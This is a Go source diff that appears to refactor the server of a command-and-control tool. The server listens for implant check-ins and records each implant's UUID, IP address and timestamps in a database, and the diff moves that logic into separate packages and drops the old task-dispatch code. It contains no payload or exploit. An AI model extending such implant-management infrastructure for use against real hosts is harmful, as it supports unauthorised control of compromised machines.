@@ -8,14 +8,16 @@ import (
     "time"
     "unicode/utf8"
 
-    "b00fkit/asciiArt"
-    "b00fkit/httpui"
-    "b00fkit/sqldb"
+    "desukit/asciiArt"
+    "desukit/httpui"
+    "desukit/sqldb"
+    "desukit/sqldb/schema"
+    "desukit/sqldb/model"
+    "desukit/sqldb/controller/client"
+    //"desukit/sqldb/controller/task"
 
     "github.com/spf13/viper"
 )
-
-
 
 func main() {
     viper.SetConfigName("config")
@@ -37,29 +39,10 @@ func main() {
     // ----------- START DB -----------------------
     // database functionality. sqldb makes the database a global variable
     // ConnectDB() only needs to be ran once from main and the db is 
-    // accessible anywhere by importing sqldb package like httpui for example
+    // accessible anywhere by importing sqldb package like within httpui for example
     sqldb.ConnectDB()
-
-    // table: clients
-    // columns:
-    // id primary key
-    // uuid text not null unique
-    // ipaddr text
-    // ts_first text not null -- timestamp of when first seen
-    // ts_last text not null -- most recent timestamp
-    statement, _ := sqldb.DB.Prepare("CREATE TABLE IF NOT EXISTS clients (id INTEGER PRIMARY KEY, uuid TEXT NOT NULL UNIQUE, ipaddr TEXT, ts_first TEXT NOT NULL, ts_last TEXT NOT NULL)")
-    statement.Exec() 
-
-    // table: tasks
-    // columns:
-    // id primary key
-    // uuid text not null unique
-    // task_queued integer
-    // queue int
-    // ts_last text -- timestamp of last execution
-    statement, _ = sqldb.DB.Prepare("CREATE TABLE IF NOT EXISTS tasks (id INTEGER PRIMARY KEY, uuid TEXT NOT NULL UNIQUE, task_queued INTEGER, queue INTEGER, ts_last TEXT)")
-    statement.Exec()
-    // ------------ END DB ----------------------
+    //schema.InitializeDB() will create the tables if they haven't been created yet
+    schema.InitializeDB()
 
     // listener 
     l, err := net.Listen(CONN_TYPE, CONN_HOST+":"+CONN_PORT)
@@ -71,6 +54,7 @@ func main() {
     defer l.Close()
     fmt.Println("Listening on " + CONN_HOST + ":" + CONN_PORT)
 
+    // Start webserver for web interface
     go httpui.Start()
 
     // listener loop
@@ -105,32 +89,23 @@ func handleRequest(conn net.Conn) {
     t := time.Now()
     timestamp := t.Format("15:04:05 01-02-2006")
 
+    //Implant will check in and pickup any tasks if assigned
     if checkchar == checkcharrecv {
-        // Hearbeat
+        // Remove heart character
         uuid = uuid[3:]
+		C := model.Client{uuid, ipaddr, timestamp, timestamp}
         
-        statement, _ := sqldb.DB.Prepare("INSERT INTO clients (uuid, ipaddr, ts_last) VALUES (?, ?, ?)")
-        statement.Exec(uuid, ipaddr, timestamp)
-
-        statement, _ = sqldb.DB.Prepare("UPDATE clients SET ts_last = ? WHERE uuid = ?")
-        statement.Exec(timestamp, uuid)
-
-        fmt.Printf("\033[2K\rLast Seen: %s [%s] @ %s", uuid, ipaddr, timestamp)
-
-        // Task checking
-        var task_queued int
-        task_row := sqldb.DB.QueryRow("SELECT task_queued FROM tasks WHERE uuid = $1", uuid)
-        task_row.Scan(&task_queued)
-
-        print(task_queued)
-
-        if task_queued != 0 {                           // var x int; x != 0 will make int behave as bool
-            message := "awful\n"
-            conn.Write([]byte(message))
-            
-            statement, _ = sqldb.DB.Prepare("UPDATE tasks SET task_queued = 0, ts_last = ? WHERE uuid = ?")
-            statement.Exec(timestamp, uuid)
+        // Check for existince in DB
+        exists := client.CheckClient(C)
+        // Register client into database if it doesn't exist 
+        if !exists {
+            client.RegisterClient(C)
+        } else {
+        // Update Timestamp
+            client.UpdateClient(C)
         }
-        
+
+        fmt.Printf("\033[2K\rLast Seen: %s [%s] @ %s", C.Uuid, C.Ipaddr, C.Ts_last)
+
     } 
 }
